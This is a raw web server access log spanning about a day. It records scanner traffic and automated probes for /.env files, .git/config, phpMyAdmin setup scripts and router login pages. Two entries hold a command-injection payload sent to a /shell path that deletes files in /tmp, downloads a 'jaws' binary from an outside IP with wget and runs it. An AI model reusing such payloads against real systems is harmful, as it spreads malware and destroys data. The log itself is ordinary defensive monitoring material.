localhost:80 143.110.160.150 - - [30/Apr/2023:09:15:51 +0000] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 483 "-" "-"
localhost:80 143.110.160.150 - - [30/Apr/2023:09:15:53 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 143.110.160.150 - - [30/Apr/2023:09:15:54 +0000] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 483 "-" "-"
localhost:80 200.196.142.125 - - [30/Apr/2023:09:30:13 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
localhost:80 43.154.128.189 - - [30/Apr/2023:09:37:54 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:10:13:23 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:10:13:23 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:10:52:21 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:10:52:21 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [30/Apr/2023:10:56:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [30/Apr/2023:11:05:18 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [30/Apr/2023:12:14:34 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 109.237.97.180 - - [30/Apr/2023:12:21:32 +0000] "\x16\x03\x01\x01H\x01" 400 483 "-" "-"
localhost:80 109.237.97.180 - - [30/Apr/2023:12:21:32 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:12:25:35 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:12:25:35 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 109.237.98.226 - - [30/Apr/2023:12:36:05 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 109.237.98.226 - - [30/Apr/2023:12:36:05 +0000] "\x16\x03\x01\x01H\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [30/Apr/2023:12:41:28 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 45.79.128.205 - - [30/Apr/2023:12:51:22 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 185.254.196.173 - - [30/Apr/2023:13:31:44 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.173 - - [30/Apr/2023:13:31:45 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [30/Apr/2023:13:32:45 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:13:44:09 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:13:44:09 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [30/Apr/2023:14:50:58 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [30/Apr/2023:15:06:11 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 179.43.163.132 - - [30/Apr/2023:15:20:06 +0000] "GET / HTTP/1.1" 200 22418 "-" "-"
localhost:80 179.43.163.132 - - [30/Apr/2023:15:20:07 +0000] "POST /HNAP1/ HTTP/1.1" 301 495 "-" "Mozila/5.0"
localhost:80 159.89.186.250 - - [30/Apr/2023:15:21:49 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 66.175.213.4 - - [30/Apr/2023:15:27:43 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 135.125.246.189 - - [30/Apr/2023:15:36:50 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:15:36:50 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [30/Apr/2023:16:09:19 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 95.214.27.204 - - [30/Apr/2023:16:13:11 +0000] "GET /muieblackcat HTTP/1.1" 404 245 "-" "-"
localhost:80 95.214.27.204 - - [30/Apr/2023:16:13:11 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 245 "-" "-"
localhost:80 95.214.27.204 - - [30/Apr/2023:16:13:11 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 245 "-" "-"
localhost:80 95.214.27.204 - - [30/Apr/2023:16:13:11 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 404 245 "-" "-"
localhost:80 95.214.27.204 - - [30/Apr/2023:16:13:11 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 245 "-" "-"
localhost:80 95.214.27.204 - - [30/Apr/2023:16:13:11 +0000] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 245 "-" "-"
localhost:80 172.105.128.12 - - [30/Apr/2023:17:01:36 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [30/Apr/2023:17:15:59 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [30/Apr/2023:17:27:50 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:17:48:06 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:17:48:06 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [30/Apr/2023:18:36:34 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [30/Apr/2023:18:46:14 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:18:53:50 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:18:53:50 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 47.100.102.203 - - [30/Apr/2023:18:56:20 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.215.81.11/jaws;chmod+/tmp/jaws;sh+/tmp/jaws" 400 483 "-" "-"
localhost:80 172.105.128.11 - - [30/Apr/2023:18:57:14 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 114.35.88.158 - - [30/Apr/2023:19:00:47 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 193.42.32.175/jaws;sh+/tmp/jaws" 400 483 "-" "-"
localhost:80 185.254.196.186 - - [30/Apr/2023:19:06:04 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.186 - - [30/Apr/2023:19:06:04 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [30/Apr/2023:20:04:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 54.202.254.14 - - [30/Apr/2023:20:25:36 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a"
localhost:80 198.235.24.140 - - [30/Apr/2023:20:28:46 +0000] "GET / HTTP/1.0" 200 22396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 193.32.162.159 - - [30/Apr/2023:20:33:03 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.246.189 - - [30/Apr/2023:20:59:33 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:20:59:33 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 192.155.90.220 - - [30/Apr/2023:21:05:38 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 121.152.51.88 - - [30/Apr/2023:21:21:08 +0000] "GET / HTTP/1.0" 200 13312 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
localhost:80 43.154.128.189 - - [30/Apr/2023:21:22:53 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [30/Apr/2023:21:59:34 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 192.241.194.54 - - [30/Apr/2023:22:12:53 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 zgrab/0.x"
localhost:80 142.93.74.27 - - [30/Apr/2023:22:38:08 +0000] "GET /manager/html HTTP/1.1\n" 400 483 "-" "-"
localhost:80 43.154.128.189 - - [30/Apr/2023:22:41:32 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:22:43:38 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [30/Apr/2023:22:43:38 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 172.105.128.13 - - [30/Apr/2023:23:25:43 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 198.235.24.252 - - [30/Apr/2023:23:35:41 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 178.128.114.210 - - [30/Apr/2023:23:59:01 +0000] "GET / HTTP/1.1" 200 6344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
localhost:80 178.128.114.210 - - [30/Apr/2023:23:59:01 +0000] "GET /favicon.ico HTTP/1.1" 200 5731 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
localhost:80 43.154.128.189 - - [30/Apr/2023:23:59:28 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 38.110.46.2 - - [01/May/2023:00:14:10 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 38.110.46.2 - - [01/May/2023:00:14:10 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.154.4 - - [01/May/2023:00:14:23 +0000] "GET / HTTP/1.1" 200 6285 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.154.4 - - [01/May/2023:00:14:23 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.155.4 - - [01/May/2023:00:15:09 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 199.45.155.4 - - [01/May/2023:00:15:09 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 43.248.128.82 - - [01/May/2023:00:17:26 +0000] "GET / HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 171.67.71.144 - - [01/May/2023:00:17:51 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 171.67.71.144 - - [01/May/2023:00:17:51 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0"
localhost:80 104.131.128.20 - - [01/May/2023:00:24:44 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 35.203.211.38 - - [01/May/2023:00:29:55 +0000] "GET / HTTP/1.1" 200 22418 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 3.111.45.61 - - [01/May/2023:00:31:06 +0000] "GET / HTTP/1.1" 200 6305 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:00:41:51 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:00:41:51 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:00:47:12 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 45.79.128.205 - - [01/May/2023:00:59:33 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 142.93.74.27 - - [01/May/2023:01:09:25 +0000] "GET /script HTTP/1.1\n" 400 483 "-" "-"
localhost:80 135.125.246.189 - - [01/May/2023:01:14:04 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:01:14:04 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [01/May/2023:01:17:53 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 162.142.125.13 - - [01/May/2023:01:49:56 +0000] "GET / HTTP/1.1" 200 22418 "-" "-"
localhost:80 162.142.125.13 - - [01/May/2023:01:49:56 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
localhost:80 162.142.125.13 - - [01/May/2023:01:49:57 +0000] "PRI * HTTP/2.0" 400 483 "-" "-"
localhost:80 162.142.125.13 - - [01/May/2023:01:49:57 +0000] "GET /favicon.ico HTTP/1.1" 200 5695 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
localhost:80 205.210.31.147 - - [01/May/2023:02:01:19 +0000] "GET / HTTP/1.1" 200 22418 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 135.125.246.189 - - [01/May/2023:02:18:02 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:02:18:02 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:02:23:43 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 185.254.196.173 - - [01/May/2023:02:32:29 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.173 - - [01/May/2023:02:32:30 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [01/May/2023:02:36:12 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 44.234.58.34 - - [01/May/2023:02:43:19 +0000] "OPTIONS / HTTP/1.1" 404 245 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
localhost:80 172.105.128.12 - - [01/May/2023:02:53:40 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 205.210.31.19 - - [01/May/2023:03:14:49 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 34.78.249.41 - - [01/May/2023:03:33:32 +0000] "GET / HTTP/1.1" 200 6343 "-" "python-requests/2.28.2"
localhost:80 43.154.128.189 - - [01/May/2023:03:56:23 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [01/May/2023:04:00:55 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.246.189 - - [01/May/2023:04:44:12 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:04:44:12 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 87.121.221.49 - - [01/May/2023:04:46:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2150 "http://54.155.101.2:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
localhost:80 94.102.61.10 - - [01/May/2023:04:55:43 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
localhost:80 88.247.125.252 - - [01/May/2023:04:58:10 +0000] "GET / HTTP/1.0" 200 22396 "-" "-"
localhost:80 172.104.11.46 - - [01/May/2023:05:02:17 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 43.154.128.189 - - [01/May/2023:05:15:15 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 91.230.153.102 - - [01/May/2023:05:28:31 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
localhost:80 86.252.34.181 - - [01/May/2023:05:31:51 +0000] "GET / HTTP/1.0" 200 13936 "-" "-"
localhost:80 193.32.162.159 - - [01/May/2023:05:48:01 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 95.214.27.80 - - [01/May/2023:05:57:17 +0000] "GET /.git/config HTTP/1.1" 404 282 "-" "python-requests/2.28.1"
localhost:80 185.254.196.186 - - [01/May/2023:06:18:00 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 185.254.196.186 - - [01/May/2023:06:18:00 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 57.128.171.214 - - [01/May/2023:06:22:44 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
localhost:80 144.217.90.96 - - [01/May/2023:06:23:06 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
localhost:80 205.210.31.150 - - [01/May/2023:06:25:13 +0000] "GET / HTTP/1.0" 200 22396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 43.154.128.189 - - [01/May/2023:06:33:42 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.189 - - [01/May/2023:06:36:07 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
